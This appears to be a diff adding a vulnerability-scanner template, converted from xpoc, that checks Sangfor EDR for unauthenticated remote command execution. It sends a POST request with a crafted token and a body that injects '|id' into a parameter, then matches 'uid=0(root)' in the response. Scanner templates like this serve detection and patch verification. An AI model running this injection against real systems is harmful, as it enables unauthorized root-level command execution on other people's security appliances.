@@ -1,0 +1,24 @@
+id: yaml-poc-sangfor-edr-rce-CT-158113
+info:
+  name: Yaml Poc Sangfor Edr Rce Ct 158113
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-sangfor-edr-rce-CT-158113'
+  tags: rce
+  reference: []
+http:
+- method: POST
+  path:
+  - /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
+  body: '{"params":"w=123\"''1234123''\"|id"}'
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - uid=0(root)
